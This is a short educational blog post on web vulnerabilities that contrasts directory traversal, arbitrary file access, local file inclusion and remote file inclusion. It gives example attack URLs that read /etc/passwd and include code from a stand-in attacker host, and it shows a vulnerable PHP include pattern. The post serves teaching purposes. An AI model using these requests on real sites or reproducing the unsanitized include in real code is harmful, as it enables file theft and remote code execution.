---
title: Local file inclusion & remote file inclusion
categories: Vulnerabilities
date: 2020-02-09 
author: shiva G prasadh
published: true
---
 
Sometime you might be confused when you think about the difference between Arbitrary file access, Local file inclusion and Remote file inclusion attacks. Lets discuss about the differences.  
 
### [](#header-3) Directory Traversal Attack
 
Directory traversal attacks that allowed an attacker to ‘traverse’ outside an intended directory to access a file or directory that was not intended.
eg. http://vulnerableWebSite.com/apps/index.php?file=../../../../../../etc/passwd
Making this request would direct the script to traverse outside the web server document root (DOCROOT) to access the system password file (/etc/passwd).

* * * 
### [](#header-3) Arbitrary File Access
 
If the application is running with full privileges and could access any file on the system by traversal, and it only allows an attacker to read the contents of the file, not write to it or execute it as a script, It qualified to “traversal arbitrary file access”.
eg. http://vulnerableWebSite.com/apps/index.php?file=../../../../tmp/shell.php
In this traversal arbitrary file access issue, the contents of shell.php will be displayed, not executed.

* * *
 
### [](#header-3) Local File Inclusion (LFI) attack
 
It often exhibit the same trait as directory traversal attacks, the attack typically involves a relative (e.g. ../../) or absolute path (e.g. &file=/path/to/file) to call a specific file on the system. The difference is in how the application handles the request. Instead of displaying the contents of the file like above, it will include the file as if it is an executable script. This means that arbitrary code, but limited to what is already on the file system, will be executed with the same privileges as the web application and/or web server.  
Basically, the difference is that with a file inclusion vulnerability, the resource is loaded and executed in the context of the current application. A directory traversal vulnerability on the other hand, only gives you the ability to read the resource.

* * *
 
### [](#header-3) Remote File Inclusion (RFI) attack
 
It allows an attacker to include a remotely hosted file, usually through a script on the web server. The vulnerability occurs due to the use of user-supplied input without proper validation.  
it can also lead to:  
 
Code execution on the web server
Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS) 
Denial of Service (DoS)  
Sensitive Information Disclosure
 
Since RFI occurs when paths passed to "include" statements are not properly sanitized, in a blackbox testing approach, we should look for scripts which take filenames as parameters. Consider the following PHP example:  
```
$incfile = $_REQUEST["file"];
include($incfile.".php");
In this example the path is extracted from the HTTP request and no input validation is done.
http://vulnerableWebSite.com/vulnPage.php?file=http://attackerSite/malicousURL
```
